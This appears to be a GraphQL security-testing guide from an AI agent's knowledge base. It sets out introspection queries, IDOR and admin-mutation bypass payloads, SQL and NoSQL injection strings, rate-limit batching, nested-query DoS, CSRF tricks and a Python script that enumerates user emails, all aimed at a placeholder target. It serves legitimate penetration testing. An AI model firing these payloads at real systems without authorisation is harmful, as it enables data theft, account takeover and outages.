> Structure: the original upper half is the main workflow; the lower half adds depth. If the short table does not call something out, follow the target: introspection / IDOR / injection / batching. No need to read the entire file.
>
> Whether to write a report is determined only by `~/.grok/rules/vuln-report-format.md`. Introspection reveals schema only and no sensitive fields → continue probing fields / authorization / injection.

## I. Existing knowledge base

# GraphQL Security Testing Guide

## I. GraphQL Identification

### Common Endpoint Paths

```bash
# Standard paths
/graphql
/graphiql
/v1/graphql
/api/graphql
/query
/gql

# Detection methods
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __typename }"}'

# Response `{"data":{"__typename":"Query"}}` → confirmed GraphQL
```

---

## II. Introspection Queries (Schema Exposure)

### Full Introspection Query

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

### Simplified Introspection

```bash
# Get all types
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'

# Get all queries
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { queryType { fields { name } } } }"}'

# Get all mutations
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { mutationType { fields { name } } } }"}'
```

### Mine Information from Schema

```
Points to watch:
1. Admin-only mutations: deleteUser, updateRole, banUser
2. Internal fields: isAdmin, internalId, secretToken
3. Hidden queries: adminUsers, internalLogs, debugInfo
4. Sensitive types: CreditCard, BankAccount, PrivateMessage
```

---

## III. Authorization-Bypass Testing

### Horizontal Authorization Bypass

```graphql
# Query another user's information
query {
  user(id: "VICTIM_ID") {
    id
    email
    phone
    orders {
      id
      amount
    }
  }
}

# Modify another user's data (verify only; do not actually execute)
mutation {
  updateUser(id: "VICTIM_ID", input: {email: "attacker@evil.com"}) {
    id
    email
  }
}
```

### Vertical Authorization Bypass

```graphql
# Ordinary user calls admin mutation
mutation {
  deleteUser(id: "TARGET_ID") {
    success
  }
}

mutation {
  promoteToAdmin(userId: "MY_ID") {
    user {
      id
      role
    }
  }
}
```

---

## IV. Injection Testing

### SQL Injection

```graphql
# Inject SQL in parameters
query {
  user(id: "1' OR '1'='1") {
    id
    username
  }
}

query {
  searchUsers(keyword: "admin' UNION SELECT password FROM users--") {
    username
    email
  }
}
```

### NoSQL Injection

```graphql
# MongoDB injection
query {
  user(id: "{\"$ne\": null}") {
    id
    username
  }
}
```

---

## V. Batching Attacks

### Query Batching (Bypass Rate Limits)

```bash
# Send multiple queries in one request
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ user(id: \"1\") { email } }"},
    {"query": "{ user(id: \"2\") { email } }"},
    {"query": "{ user(id: \"3\") { email } }"},
    ...
    {"query": "{ user(id: \"1000\") { email } }"}
  ]'
```

### Alias Batching

```graphql
query {
  user1: user(id: "1") { email }
  user2: user(id: "2") { email }
  user3: user(id: "3") { email }
  ...
  user1000: user(id: "1000") { email }
}
```

---

## VI. Nested-Query DoS

```graphql
# Deep nesting consumes server resources
query {
  user(id: "1") {
    posts {
      comments {
        author {
          posts {
            comments {
              author {
                posts {
                  comments {
                    author {
                      id
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}

# Circular-reference DoS
query {
  user(id: "1") {
    friends {
      friends {
        friends {
          friends {
            friends {
              id
            }
          }
        }
      }
    }
  }
}
```

---

## VII. Exploit Field Suggestions

```bash
# Deliberately misspell fields to enumerate them via "Did you mean" errors
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user { passwrd } }"}'

# Response may include: "Did you mean: password, passwordHash?"
# This can reveal hidden fields
```

---

## VIII. CSRF Testing

### CSRF via GET Requests

```bash
# Some GraphQL endpoints support GET requests
curl "https://target.com/graphql?query={user(id:\"1\"){email}}"

# If GET is supported → CSRF may be constructed
<img src="https://target.com/graphql?query=mutation{deleteUser(id:\"1\"){success}}">
```

### Content-Type Bypass

```bash
# Try text/plain to bypass CORS preflight
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: text/plain" \
  -d '{"query": "mutation { deleteUser(id: \"1\") { success } }"}'
```

---

## IX. Information Disclosure

### Error-Message Disclosure

```graphql
# Trigger errors to obtain internal information
query {
  user(id: "invalid_id_format_to_trigger_error") {
    id
  }
}

# The response may contain:
# - Database error (SQL statement)
# - Internal path (/var/www/app/...)
# - Framework version
```

### Detect Debug Mode

```bash
# Check whether debug mode is enabled
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { directives { name } } }"}'

# If it returns directives such as @debug, @internal → debug functions may be enabled
```

---

## X. Recommended Tools

### graphw00f (fingerprinting)

```bash
# Identify GraphQL engine type
pip3 install graphw00f
graphw00f -t https://target.com/graphql
```

### InQL (Burp extension)

```
Features:
- Automatic introspection
- Generate query templates
- Batch testing
- Visualize schema

Install: Burp → Extender → BApp Store → InQL Scanner
```

### graphql-voyager (schema visualization)

```bash
# Online tool
https://graphql-kit.com/graphql-voyager/

# Run locally
npm install -g graphql-voyager
voyager --introspection schema.json
```

### Automated Test Script

```python
import requests
import json

url = "https://target.com/graphql"
headers = {"Content-Type": "application/json"}

# Introspection
introspection_query = '{"query": "{ __schema { types { name } } }"}'
r = requests.post(url, headers=headers, data=introspection_query)
schema = r.json()

# Extract all types
types = [t['name'] for t in schema['data']['__schema']['types']]
print(f"Found {len(types)} types:")
for t in types:
    if not t.startswith('__'):  # Filter built-in types
        print(f"  - {t}")

# Batch ID enumeration
for user_id in range(1, 101):
    query = f'{{"query": "{{ user(id: \\"{user_id}\\") {{ id email }} }}"}}'
    r = requests.post(url, headers=headers, data=query)
    if r.status_code == 200 and 'email' in r.text:
        print(f"User {user_id}: {r.json()}")
```

---

## XI. Protection Checks

```bash
# Check whether query-depth limits exist
# Send a depth-20 nested query and observe whether it is blocked

# Check whether query-complexity limits exist
# Send a query containing 100 fields

# Check whether rate limiting exists
# Send the same query 100 times in a short interval

# Check whether introspection is disabled
# Send __schema query; an error means it is disabled
```

---

## II. Supplement: graphql-and-hidden-parameters

### graphql-and-hidden-parameters

### GraphQL and Hidden Parameters — Introspection, Batching, and Undocumented Fields

## 1. GRAPHQL FIRST PASS

```graphql
query { __typename }
query {
  __schema {
    types { name }
  }
}
```

If introspection is restricted, continue with:

- field suggestions and error-based discovery
- known type probes like `__type(name: "User")`
- JS and mobile bundle route extraction

## 2. HIGH-VALUE GRAPHQL TESTS

| Theme | Example |
|---|---|
| IDOR | `user(id: "victim")` |
| batching | array of login or object fetch operations |
| hidden fields | admin-only fields exposed in type definitions |
| nested authz gaps | related object fields with weaker checks |

## 3. HIDDEN PARAMETER DISCOVERY

Look for:

- fields present in admin docs but not public docs
- `additionalProperties` or permissive schemas
- frontend code using richer request bodies than visible UI controls
- mobile endpoints carrying role, org, feature-flag, or internal filter fields

## 4. NEXT ROUTING

- If hidden fields affect privilege: [api authorization and bola](idor-test.md)
- If GraphQL batching changes auth or rate behavior: [api auth and jwt abuse](oauth-jwt-test.md)
- If endpoint discovery is incomplete: see `recon-methodology.md` and JS reverse (`js-reverse-guide.md`)
